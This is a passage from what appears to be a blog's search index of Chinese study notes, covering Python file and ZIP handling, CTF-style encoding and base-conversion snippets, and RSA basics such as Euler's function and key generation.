class="number">-6.</span>md</span><br><span class="line">SQL注入-<span class="number">-2.</span>md</span><br><span class="line">SQL注入-<span class="number">-5.</span>md</span><br><span class="line">SQL注入-<span class="number">-1.</span>md</span><br><span class="line">SQL注入-<span class="number">-4.</span>md</span><br><span class="line">Found directory: /Users/apple/Desktop/steady-learn/笔记/漏洞原理/SQL/Mysql注入学习/sql注入</span><br><span class="line">SQL注入--过滤空格.md</span><br><span class="line">SQL注入--过滤<span class="keyword">and</span>、<span class="keyword">or</span>.md</span><br><span class="line">.DS_Store</span><br><span class="line">SQL注入--字符型和数字型注入的判断.md</span><br></pre></td></tr></table></figure><h4 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h4><h5 id="shutil-copy"><a href="#shutil-copy" class="headerlink" title="shutil.copy()"></a>shutil.copy()</h5><p>使用<code>shutil.copy()</code> 将文件从一个位置复制到另一个位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import shutil</span><br><span class="line"></span><br><span class="line">src &#x3D; &#39;path&#x2F;to&#x2F;file.txt&#39;</span><br><span class="line">dst &#x3D; &#39;path&#x2F;to&#x2F;dest_dir&#39;</span><br><span class="line">shutil.copy(src, dst)</span><br></pre></td></tr></table></figure><p> <code>shutil.copy(src，dst)</code> 会将文件 <code>src</code> 复制到 <code>dst</code> 中指定的位置。 如果 <code>dst</code> 是文件，则该文件的内容将替换为 <code>src</code> 的内容。 如果 <code>dst</code> 是目录，则 <code>src</code> 将被复制到该目录中。 <code>shutil.copy()</code> 仅复制文件的内容和文件的权限。 其他元数据（如文件的创建和修改时间）不会保留。</p><h5 id="shutil-copy2"><a href="#shutil-copy2" class="headerlink" title="shutil.copy2()"></a>shutil.copy2()</h5><p>复制时保留所有文件元数据</p><h4 id="移动文件和目录"><a href="#移动文件和目录" class="headerlink" title="移动文件和目录"></a>移动文件和目录</h4><p>要将文件或目录移动到其他位置，请使用 <code>shutil.move(src，dst)</code> 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import shutil</span><br><span class="line">dst &#x3D; shutil.move(&#39;dir_1&#x2F;&#39;, &#39;backup&#x2F;&#39;)</span><br><span class="line">print(dst)  # &#39;backup&#39;</span><br></pre></td></tr></table></figure><p>如果 <code>backup/</code> 存在，则 <code>shutil.move(&#39;dir_1/&#39;，&#39;backup/&#39;)</code> 将 <code>dir_1/</code> 移动到 <code>backup/</code> 。 如果 <code>backup/</code> 不存在，则 <code>dir_1/</code> 将重命名为 <code>backup</code> 。</p><h4 id="重命名文件和目录"><a href="#重命名文件和目录" class="headerlink" title="重命名文件和目录"></a>重命名文件和目录</h4><p>Python包含用于重命名文件和目录的 <code>os.rename(src，dst)</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.rename(&#39;first.zip&#39;, &#39;first_01.zip&#39;)</span><br></pre></td></tr></table></figure><p>上面的行将 <code>first.zip</code> 重命名为 <code>first_01.zip</code> 。 如果目标路径指向目录，则会抛出 <code>OSError</code> 。</p><h4 id="读取ZIP文件"><a href="#读取ZIP文件" class="headerlink" title="读取ZIP文件"></a>读取ZIP文件</h4><p>zipfile 模块是一个底层模块，是Python标准库的一部分。 zipfile 具有可以轻松打开和提取ZIP文件的函数。 要读取ZIP文件的内容，首先要做的是创建一个 ZipFile 对象。ZipFile 对象类似于使用 open() 创建的文件对象。ZipFile 也是一个上下文管理器，因此支持with语句：</p><p>打开ZIP文件后，可以通过 <code>zipfile</code> 模块提供的函数访问有关存档文件的信息。</p><p>要获取存档文件中的文件列表，请在 <code>ZipFile</code> 对象上调用 <code>namelist()</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line"></span><br><span class="line">with zipfile.ZipFile(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;makedown.zip&#39;, &#39;r&#39;) as fp:</span><br><span class="line">    a&#x3D;fp.namelist()</span><br><span class="line">    for i in a:</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure><p><code>.namelist()</code> 返回存档文件中文件和目录的名称列表。要检索有关存档文件中文件的信息，使用 <code>.getinfo()</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line"></span><br><span class="line">with zipfile.ZipFile(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;makedown.zip&#39;, &#39;r&#39;) as zipobj:</span><br><span class="line">    bar_info &#x3D; zipobj.getinfo(&#39;makedown&#x2F;8B77F3C7-DC39-48C0-99C5-4CC7B1C123AC.png&#39;)</span><br><span class="line">    print(bar_info.file_size)</span><br></pre></td></tr></table></figure><p><code>.getinfo()</code> 返回一个 <code>ZipInfo</code> 对象，该对象存储有关存档文件的单个成员的信息。 要获取有关存档文件中文件的信息，请将其路径作为参数传递给 <code>.getinfo()</code> 。 使用 <code>getinfo()</code> ，你可以检索有关存档文件成员的信息，例如上次修改文件的日期，压缩大小及其完整文件名。 访问 <code>.file_size</code> 将以字节为单位检索文件的原始大小。</p><h4 id="提取ZIP文件"><a href="#提取ZIP文件" class="headerlink" title="提取ZIP文件"></a>提取ZIP文件</h4><p><code>zipfile</code> 模块允许你通过 <code>.extract()</code> 和 <code>.extractall()</code> 从ZIP文件中提取一个或多个文件。</p><p>默认情况下，这些方法将文件提取到当前目录。 它们都采用可选的路径参数，允许指定要将文件提取到的其他指定目录。 如果该目录不存在，则会自动创建该目录。 要从压缩文件中提取文件，请执行以下操作：</p><p>提取所有文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import os</span><br><span class="line">data_zip &#x3D; zipfile.ZipFile(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;makedown.zip&#39;, &#39;r&#39;)</span><br><span class="line">data_zip.extractall(path&#x3D;&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1&#39;)</span><br></pre></td></tr></table></figure><p>提取某一个文件到当前目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data_zip.extract(&#39;file1.py&#39;)</span><br></pre></td></tr></table></figure><h4 id="从加密的文档提取数据"><a href="#从加密的文档提取数据" class="headerlink" title="从加密的文档提取数据"></a>从加密的文档提取数据</h4><p>zipfile 支持提取受密码保护的ZIP。 要提取受密码保护的ZIP文件，请将密码作为参数传递给 .extract() 或.extractall() 方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import zipfile</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; with zipfile.ZipFile(&#39;secret.zip&#39;, &#39;r&#39;) as pwd_zip:</span><br><span class="line">...     # 从加密的文档提取数据</span><br><span class="line">...     pwd_zip.extractall(path&#x3D;&#39;extract_dir&#39;, pwd&#x3D;&#39;Quish3@o&#39;)</span><br></pre></td></tr></table></figure><p>将以读取模式打开 <code>secret.zip</code> 存档。 密码提供给 <code>.extractall()</code> ，并且压缩文件内容被提取到 <code>extract_dir</code> 。 由于with语句，在完成提取后，存档文件会自动关闭。</p>]]></content>
      
      
      <categories>
          
          <category> Python学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-python</title>
      <link href="2018/11/30/CTF-Python/"/>
      <url>2018/11/30/CTF-Python/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF中的Python"><a href="#CTF中的Python" class="headerlink" title="CTF中的Python"></a>CTF中的Python</h1><h2 id="str-与-bytes-之间的类型转换"><a href="#str-与-bytes-之间的类型转换" class="headerlink" title="str 与 bytes 之间的类型转换"></a>str 与 bytes 之间的类型转换</h2><p>str 与 bytes 之间的类型转换如下：</p><ul><li>str ⇒ bytes：<code>bytes(s, encoding=&#39;utf8&#39;)</code></li><li>bytes ⇒ str：<code>str(b, encoding=&#39;utf-8&#39;)</code></li><li>str.encode(s)</li><li>bytes.decode(b)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># bytes object</span></span><br><span class="line"> b = <span class="string">b&quot;example&quot;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment"># str object</span></span><br><span class="line"> s = <span class="string">&quot;example&quot;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment"># str to bytes</span></span><br><span class="line"> bytes(s, encoding = <span class="string">&quot;utf8&quot;</span>)</span><br><span class="line"></span><br><span class="line"> <span class="comment"># bytes to str</span></span><br><span class="line"> str(b, encoding = <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"> <span class="comment"># an alternative method</span></span><br><span class="line"> <span class="comment"># str to bytes</span></span><br><span class="line"> str.encode(s)</span><br><span class="line"></span><br><span class="line"> <span class="comment"># bytes to str</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">二进制转换到十进制 int（<span class="string">&#x27;a&#x27;</span>，<span class="number">2</span>)</span><br><span class="line">八进制转换十六进制 hex(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">十进制转换二进制  bin(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">十六进制转换八进制 oct(<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="int函数"><a href="#int函数" class="headerlink" title="int函数"></a>int函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&quot;0x65&quot;</span><br><span class="line">print(int(a,16))</span><br><span class="line">b&#x3D;&quot;0o157&quot;</span><br><span class="line">print(int(b,8))</span><br><span class="line">c&#x3D;&quot;0o157&quot;</span><br><span class="line">print(int(c,8))</span><br><span class="line">d&#x3D;&quot;87&quot;</span><br><span class="line">print(int(d))</span><br></pre></td></tr></table></figure><h3 id="十六进制与字符串转化"><a href="#十六进制与字符串转化" class="headerlink" title="十六进制与字符串转化"></a>十六进制与字符串转化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">steady_str=<span class="string">&quot;flag&#123;Have_y0U_Py_script_Otc_To_Ten_Ascii!&#125;&quot;</span></span><br><span class="line">print(binascii.hexlify(steady_str))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">print(binascii.unhexlify(<span class="string">&quot;666c61677b486176655f7930555f50795f7363726970745f4f74635f546f5f54656e5f4173636969217d&quot;</span>))</span><br></pre></td></tr></table></figure><p>1)hex()会进行进制转换，转换结果会带有0x。而且hex只会处理数字，不能处理字符串。<br>2)unhexlify()会将十六进制解码，不仅会处理数字，还会处理字符串。</p><h3 id="二进制转换成字符串"><a href="#二进制转换成字符串" class="headerlink" title="二进制转换成字符串"></a>二进制转换成字符串</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">g=<span class="string">&#x27;0110110101111001011011100110000101101101011001010110100101110011011010110110010101111001001000010010000100100001011010000110100001101000&#x27;</span></span><br><span class="line">b=<span class="string">&#x27;&#x27;</span></span><br><span class="line">e=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(g)):</span><br><span class="line">e+=<span class="number">1</span></span><br><span class="line">print(e)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">136</span>,<span class="number">8</span>):</span><br><span class="line">b+=chr(int(g[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><p>二进制八个一组转化为十进制，转换为ascii。</p><h3 id="八进制转化转换字符串"><a href="#八进制转化转换字符串" class="headerlink" title="八进制转化转换字符串"></a>八进制转化转换字符串</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;146154141147173110141166145137171060125137120171137163143162151160164137117164143137124157137124145156137101163143151151041175&#x27;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">l=len(a)</span><br><span class="line">print(a)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,l,<span class="number">3</span>):</span><br><span class="line">flag+=chr(int(a[i:i+<span class="number">3</span>],<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> (flag)</span><br></pre></td></tr></table></figure><p>三个一组转换成十进制，然后转化为字符串。</p><h3 id="二进制转十六进制"><a href="#二进制转十六进制" class="headerlink" title="二进制转十六进制"></a>二进制转十六进制</h3><p>二进制先转成十进制，再转成 十六进制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex(int(&#39;101010&#39;,2))</span><br></pre></td></tr></table></figure><h2 id="常用小trip"><a href="#常用小trip" class="headerlink" title="常用小trip"></a>常用小trip</h2><h3 id="startswith"><a href="#startswith" class="headerlink" title="startswith()"></a>startswith()</h3><p>函数：startswith()</p><p>作用：判断字符串是否以指定字符或子字符串开头。</p><p>语法：<code>string.startswith(str, beg=0,end=len(string))</code></p><p>返回值：如果检测到字符串，则返回True，否则返回False。默认空字符为True。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&#x27;hello good boy steady&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> s.startswith(<span class="string">&#x27;h&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> s.startswith(<span class="string">&#x27;hel&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> s.startswith(<span class="string">&#x27;h&#x27;</span>,<span class="number">4</span>)</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> s.startswith(<span class="string">&#x27;go&#x27;</span>,<span class="number">6</span>,<span class="number">8</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#匹配空字符集</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> s.startswith(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="comment">#匹配元组</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> s.startswith((<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;h&#x27;</span>))</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><h3 id="大小写转化"><a href="#大小写转化" class="headerlink" title="大小写转化"></a>大小写转化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">steady_dic=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">steady_dic1=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">print(steady_dic.lower())</span><br><span class="line">print(steady_dic1.upper())</span><br></pre></td></tr></table></figure><h3 id="大小写字母"><a href="#大小写字母" class="headerlink" title="大小写字母"></a>大小写字母</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">words1 = list(string.ascii_uppercase)</span><br><span class="line">print(words1)</span><br><span class="line"></span><br><span class="line">words2 = list(string.ascii_lowercase)</span><br><span class="line">print(words2)</span><br><span class="line"></span><br><span class="line">words3 = list(string.ascii_letters)</span><br><span class="line">print(words3)</span><br></pre></td></tr></table></figure><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>去除空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady_str&#x3D;re.sub(r&quot;  &quot;,&quot;&quot;,steady_str)</span><br></pre></td></tr></table></figure><p>提取某些字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady_str&#x3D;re.findall(r&#39;&lt;(.*?)&lt;&#39;,steady_str)</span><br></pre></td></tr></table></figure><h2 id="enumerate"><a href="#enumerate" class="headerlink" title="enumerate"></a>enumerate</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iv&#x3D;[2,3,7,5,13,12,9,1,8,10,4,11,6]</span><br><span class="line">for x,y in enumerate(iv):</span><br><span class="line">    print(x,y)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0 2</span><br><span class="line">1 3</span><br><span class="line">2 7</span><br><span class="line">3 5</span><br><span class="line">4 13</span><br><span class="line">5 12</span><br><span class="line">6 9</span><br><span class="line">7 1</span><br><span class="line">8 8</span><br><span class="line">9 10</span><br><span class="line">10 4</span><br><span class="line">11 11</span><br><span class="line">12 6</span><br></pre></td></tr></table></figure><h2 id="Python列表"><a href="#Python列表" class="headerlink" title="Python列表"></a>Python列表</h2><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p>使用list将字符串转化为列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steay_str&#x3D;&quot;steady&quot;</span><br><span class="line">print(list(steay_str))</span><br><span class="line">[&#39;s&#39;, &#39;t&#39;, &#39;e&#39;, &#39;a&#39;, &#39;d&#39;, &#39;y&#39;]</span><br></pre></td></tr></table></figure><p>结合<code>range()</code>函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(list(range(3)))</span><br><span class="line">[0, 1, 2]</span><br></pre></td></tr></table></figure><h3 id="列表切片"><a href="#列表切片" class="headerlink" title="列表切片"></a>列表切片</h3><p>切片使用2个冒号分隔的3个数字来完成：</p><p>第一个数字表示切片的开始位置，默认为0</p><p>第二个数字表是切片的截止（但不包含）位置（默认为列表长度）</p><p>第三个数字表示切片的步长(默认为1)，当步长省略时，顺便可以省略最后一个冒号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">li &#x3D; [1, 4, 5, 6, 7, 9, 11, 14, 16]</span><br><span class="line">li[::-1] &#x3D;&#x3D; [16,14,11,9,7,6,5,4,1] # 翻转整个列表</span><br><span class="line">li[::-2] &#x3D;&#x3D; [16,11,7,5,1] # 翻转整个列表，再按2间隔过滤</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">List&#x3D;[3,4,5,6,7,9,11,13,15,17]</span><br><span class="line">print(List[::])  #[3, 4, 5, 6, 7, 9, 11, 13, 15, 17]</span><br><span class="line">print(List[::-1])  #[17, 15, 13, 11, 9, 7, 6, 5, 4, 3]</span><br><span class="line">#加了负号，就是一个逆向输出</span><br><span class="line">print(List[::2])  # [3, 5, 7, 11, 15]</span><br><span class="line">#以步长为2进行输出，输出下标依次为0 2 4 6</span><br><span class="line">print(List[1::2])  #[4, 6, 9, 13, 17],从一开始步长为2</span><br><span class="line">print(List[3::])  #[6, 7, 9, 11, 13, 15, 17]</span><br><span class="line">print(List[3:6])  #省略的是步长，而且不包括下标为6的元素   #[6, 7, 9]</span><br></pre></td></tr></table></figure><p>其他函数</p><p>用len()方法，统计全部元素的个数。</p><p>用count()方法，统计指定值的元素的个数。</p><p>用max()方法，统计元素中的最大值（要求元素类型相同；数字类型直接比较，其它类型比较id）</p><p>用min()方法，统计元素中的最小值（要求元素类型相同；数字类型直接比较，其它类型比较id）</p><p>用index()方法，查找指定值的元素的索引位置（第一个匹配项）。</p><p>用reverse()方法，翻转列表中的元素。</p><p>用copy()方法，浅拷贝并生成新的列表。</p><p>用deepcopy()方法，深拷贝并生成新的列表。</p><p>用sort()方法，在原列表基础上进行排序。</p><p>用sorted()方法，将新列表基础上对原列表的元素进行排序。</p><h2 id="itertools"><a href="#itertools" class="headerlink" title="itertools"></a>itertools</h2><p>Python的内建模块<code>itertools</code>提供了非常有用的用于操作迭代对象的函数。</p><h3 id="“无限”迭代器"><a href="#“无限”迭代器" class="headerlink" title="“无限”迭代器"></a>“无限”迭代器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">natuals = itertools.count(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> natuals:</span><br><span class="line">     print(n)</span><br></pre></td></tr></table></figure><p><code>count()</code>会创建一个无限的迭代器，所以上述代码会打印出自然数序列，根本停不下来，只能按<code>Ctrl+C</code>退出。</p><h3 id="repeat"><a href="#repeat" class="headerlink" title="repeat()"></a>repeat()</h3><p>负责把一个元素无限重复下去，不过如果提供第二个参数就可以限定重复次数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">ns &#x3D; itertools.repeat(&#39;A&#39;, 3)</span><br><span class="line">for n in ns:</span><br><span class="line">     print(n)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\12521&gt; &amp; F:&#x2F;web_envioment&#x2F;python3&#x2F;python3.exe c:&#x2F;Users&#x2F;12521&#x2F;Desktop&#x2F;2.py</span><br><span class="line">A</span><br><span class="line">A</span><br><span class="line">A</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF-python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-RSA</title>
      <link href="2018/11/08/CTF-RSA/"/>
      <url>2018/11/08/CTF-RSA/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-RSA"><a href="#CTF-RSA" class="headerlink" title="CTF-RSA"></a>CTF-RSA</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="什么是”素数”"><a href="#什么是”素数”" class="headerlink" title="什么是”素数”"></a>什么是”素数”</h3><p>不能表示为其它任何两个整数的乘积(除了1或者本身)，比如13只能是13*1=13，3*5=15，15就不是质数。</p><h3 id="什么是”互质数”"><a href="#什么是”互质数”" class="headerlink" title="什么是”互质数”"></a>什么是”互质数”</h3><p>公约数只有1的两个数，叫做互质数。</p><h3 id="模运算"><a href="#模运算" class="headerlink" title="模运算"></a>模运算</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10 mod 3&#x3D;1；26 mod 6&#x3D;2；28 mod 2 &#x3D;0</span><br></pre></td></tr></table></figure><h3 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h3><h4 id="什么是欧拉函数"><a href="#什么是欧拉函数" class="headerlink" title="什么是欧拉函数"></a>什么是欧拉函数</h4><p>欧拉函数是小于x的整数中与x互素的数的个数，一般用φ(x)表示。特殊的，φ(1)=1。</p><h4 id="如何计算欧拉函数"><a href="#如何计算欧拉函数" class="headerlink" title="如何计算欧拉函数"></a>如何计算欧拉函数</h4><p>通式：<code>φ(n)=n*(1-1/p1)*(1-1/p2)*(1-1/p3)*(1-1/p4)*…*(1-1/pn)</code>,其中<code>p1, p2……pn</code>为n的所有素因数，n是不为0的整数。</p><h3 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h3><p>欧拉定理是指：如果两个正整数a和n互素，则n的欧拉函数φ(n)可以让下面的式子成立：</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/1249281-20190928135512953-1986238612.png" alt="img"></p><p>即a的φ(n)次方减去1，可以被n整除. 比如，3和4互质，φ(4)=2，(3^2-1)/4=2. 当a为正整数，n为素数且a不能被n整除时，则有a^(n-1) ≡ 1 (mod n)这就是费马小定理.</p><h3 id="RSA加密算法"><a href="#RSA加密算法" class="headerlink" title="RSA加密算法"></a>RSA加密算法</h3><h4 id="密钥的生成过程"><a href="#密钥的生成过程" class="headerlink" title="密钥的生成过程"></a>密钥的生成过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 随意选择两个大的素数p和q，p不等于q，计算n &#x3D; pq.</span><br><span class="line">2. 根据欧拉函数的性质3，求得r&#x3D;φ(n)&#x3D;φ(p)φ(q)&#x3D;(p-1)(q-1).</span><br><span class="line">3. 选择一个小于r的整数e,且e与r互素；并求得e关于r的模反元素，命名为d.(模反元素存在，当且仅当e与r互质; 求d令ed≡1(mod r)）</span><br><span class="line">4. 将p和q的记录销毁</span><br></pre></td></tr></table></figure><p>(n，e)是公钥，(n，d)是私钥. 例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. A随机选两个不相等的质数61和53，并计算两数的积n&#x3D;61*53&#x3D;3233，n的长度就是密钥长度。3233的二进制是110010100001，一共12位， </span><br><span class="line">所以这个密钥就是12位. 实际应用中，RSA密钥一般是1024位，重要的场合是2048位.</span><br><span class="line">2. 计算n的欧拉函数; φ(n)&#x3D;(p-1)(q-1)&#x3D;60*52&#x3D;3120.</span><br><span class="line">3. 